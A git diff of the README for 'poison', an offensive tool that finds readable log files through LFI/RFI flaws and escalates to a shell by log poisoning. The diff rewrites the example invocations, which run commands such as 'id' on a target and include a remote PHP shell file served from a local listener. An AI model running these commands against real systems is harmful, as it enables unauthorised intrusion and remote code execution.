@@ -2,10 +2,6 @@
 Fast tool to search accessible log's files for LFI/RFI vulnerabilities, and automatic escalation to shell
 all the wordlists and payloads is included
 
-## Exploitation:
-![Preview](https://github.com/user-attachments/assets/8d658876-79d6-41f1-9456-91681be9782e)
-
-
 ## Installation:
 ```
 git clone https://github.com/coldt3ars/poison
@@ -13,13 +9,16 @@ cd poison
 pip install -r requirements.txt
 python3 poison.py
 ```
+# Exploitation
 ## Example usage (LFI):
+![LFI](https://github.com/user-attachments/assets/bd3a864f-03ea-42dd-a5f5-8d10e803cf33)
+
 ```
-./poison.py -u 'http://127.0.0.1/file.php?file=' -e 'id' -p src/payloads.txt -w src/small.txt
+./poison.py -u 'http://localhost/index.php?page=/etc/passwd' -e 'id' -w src/small.txt -p src/payloads.txt
 ```
 _____________________________________________________________________________________________
 ```
--u 'http://127.0.0.1/file.php?file=' # URL for poison the log
+-u 'http://localhost/index.php?page=/etc/passwd' # URL for poison the log
 ```
 
 ```
@@ -27,44 +26,37 @@ ________________________________________________________________________________
 ```
 
 ```
--p src/payloads.txt # list of paylods during the poisoning
+-w src/small.txt # wordlist using the search for available log's file
 ```
 
 ```
--w src/small.txt # wordlist using the search for available log's file
+-p src/payloads.txt # list of paylods during the poisoning
 ```
+
 ## Example usage (RFI):
+![RFI](https://github.com/user-attachments/assets/1d6b7044-5ae5-4a44-aa94-33f3513d49a2)
 ```
-/poison.py -u 'http://127.0.0.1/index.php?page=' --rfi --lhost 10.10.10.10 --rhost 127.0.0.1 --rport 14852 --lfile 'src/shell.php' -e 'id' --cookie 'PHPSESSID=1234567890'
+./poison.py -u 'http://localhost/index.php?page=/etc/passwd' -w src/big.txt -p src/payloads.txt --rfi --lfile src/script.php --lhost 127.0.0.1 --lport 12345 -e ''
 ```
-![screenshot](https://github.com/user-attachments/assets/061fdbe8-5b76-43d8-816f-068abf521744)
 _____________________________________________________________________________________________
 ```
 --rfi # Remote File Inclusion option
 ```
 
 ```
---lhost 10.10.10.10 # which network interface to bind the local HTTP server to (necesssary only on remote explotiation)
+--lhost 127.0.0.1 # remote-ip-address of http-server in request during the RFI
 ```
 
 ```
--rhost 127.0.0.1 # remote-ip-address of http-server in request during the RFI
+--lport 12345 # remote-port of http-server in request during the RFI
 ```
 
 ```
---rport 14852 # remote-port of http-server in request during the RFI
+--lfile 'src/script.php' # payload which include in the request during the RFI
 ```
 
 ```
---lfile 'src/shell.php' # payload which include in the request during the RFI
-```
-
-```
--e 'id' # command for src/shell.php 
-```
-
-```
---cookie 'PHPSESSID=1234567890' # cookie for authorized requests
+-e '' # no-op function
 ```
 
 # ToDo list:
